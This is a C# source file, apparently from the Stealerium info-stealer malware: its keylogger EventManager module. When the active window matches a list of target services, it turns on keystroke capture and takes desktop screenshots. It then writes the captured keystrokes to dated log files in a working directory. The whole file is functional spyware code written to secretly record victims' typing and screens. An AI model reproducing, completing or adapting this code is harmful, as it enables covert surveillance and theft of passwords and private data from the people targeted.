using System;
using System.IO;
using System.Linq;
using Stealerium.Helpers;
using Stealerium.Target.System;

namespace Stealerium.Modules.Keylogger
{
    internal sealed class EventManager
    {
        private static readonly string KeyloggerDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\keylogger\\" +
                                 DateTime.Now.ToString("yyyy-MM-dd"));

        // Start keylogger only if active windows contains target values
        public static void Action()
        {
            if (Detect())
            {
                if (!string.IsNullOrWhiteSpace(Keylogger.KeyLogs)) Keylogger.KeyLogs += "\n\n";
                Keylogger.KeyLogs += "### " + WindowManager.ActiveWindow + " ### (" +
                                     DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + ")\n";
                DesktopScreenshot.Make(KeyloggerDirectory);
                Keylogger.KeyloggerEnabled = true;
            }
            else
            {
                SendKeyLogs();
                Keylogger.KeyloggerEnabled = false;
            }
        }

        // Detect target data in active window
        private static bool Detect()
        {
            return Config.KeyloggerServices.Any(text => WindowManager.ActiveWindow.ToLower().Contains(text));
        }

        // Save logs
        private static void SendKeyLogs()
        {
            if (Keylogger.KeyLogs.Length < 45 ||
                string.IsNullOrWhiteSpace(Keylogger.KeyLogs))
                return;

            var logfile = KeyloggerDirectory + "\\" + DateTime.Now.ToString("hh.mm.ss") + ".txt";
            if (!Directory.Exists(KeyloggerDirectory))
                Directory.CreateDirectory(KeyloggerDirectory);

            File.WriteAllText(logfile, Keylogger.KeyLogs);
            Keylogger.KeyLogs = ""; // Clean logs
        }
    }
}